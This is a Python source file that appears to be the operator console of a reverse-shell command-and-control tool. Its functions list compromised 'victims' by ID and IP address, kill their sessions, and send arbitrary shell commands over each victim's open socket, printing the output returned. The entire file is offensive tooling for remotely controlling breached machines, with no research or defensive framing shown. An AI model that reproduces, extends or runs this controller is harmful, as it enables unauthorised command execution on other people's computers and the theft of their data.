import sys
from colorama import Fore, Back, Style
import victims
import time

def exit_program():
    print(Fore.GREEN+"Bye!!!"+Style.RESET_ALL)
    sys.exit(0)
def print_main_help_msg():
				
		print(
		f'''
		\r  Command          Description
		\r  -------          -----------
		\r  help             Print this message.
		\r  send             Send Command to victim.
		\r  victims          List victims.
		\r  kill             Terminate victim connection.
		\r  exit             Kill all sessions and quit.
''')
def list_victims():
    print(Back.MAGENTA + "Listing all current vicitims..." + Style.RESET_ALL)
    if (victims.VICTIM_CTR) != 0:
            for victim in victims.VICTIM_LIST:
                print(Fore.CYAN + "Victim " + str(victim['ID']), ":", str(victim['IP']) + Style.RESET_ALL)
    else:
        print(Back.RED + "No victims at this time" + Style.RESET_ALL)

def kill_victim(victim):
    vic = int(victim[0])
    if len(victim) != 1:
        print(Fore.RED+"Invalid Argument. Only one argument should follow the 'kill command, and it should be a number"+Style.RESET_ALL)
        print("     Example: 'kill 1'")
    elif victims.VICTIM_CTR == 0:
        print(Back.RED+"Victim list is empty"+Style.RESET_ALL)
    elif victims.VICTIM_CTR < vic:
        print(Fore.RED+"Victim does not exist"+Style.RESET_ALL)
    else:
        is_there = 0
        for shells in victims.VICTIM_LIST:
            if shells['ID'] == vic:
                is_there = 1
                del victims.VICTIM_LIST[vic-1]
                victims.VICTIM_CTR = victims.VICTIM_CTR - 1
                print(Fore.GREEN+"Successfully killed Victim: "+str(vic)+Style.RESET_ALL)
                if len(victims.VICTIM_LIST) == 0:
                    victims.VICTIM_LIST = [{}]
        if is_there == 0:
            print(Fore.RED+"Victim does not exist"+Style.RESET_ALL)
def send(cmd):
    full_cmd=""
    victim = int(cmd[0])
    victim_exists = False

    if  len(cmd) < 2:
        print(Fore.RED+"Incorrect Command. Please send commands in the format:"+Style.RESET_ALL)
        print("send <victim_number> <command>")
    else:
        cmd.pop(0)

        if victims.VICTIM_CTR == 0:
            print(Fore.RED+"No victims."+Style.RESET_ALL)
        else:
    
            for vics in victims.VICTIM_LIST:
                if int(victim) == vics["ID"]:
                    victim_exists = True
    
            if victim_exists == True:
                for args in cmd:
                    full_cmd = full_cmd + args + " "
                full_cmd = full_cmd[:-1]
                full_cmd += "\n"

                print(Fore.GREEN+"Sending command"+Style.RESET_ALL)
                print("")

                connection = victims.VICTIM_LIST[victim-1]["Connection"]
                connection.send(full_cmd.encode())
                time.sleep(1)
                ans = connection.recv(8192).decode()
                sys.stdout.write(ans)
                print("")
                print(Fore.GREEN+"All info gathered"+Style.RESET_ALL)
                

            else:
                print(Fore.RED+"Victim does not exist. Please send commands in the format:"+Style.RESET_ALL)
                print("send <victim_number> <command>")
    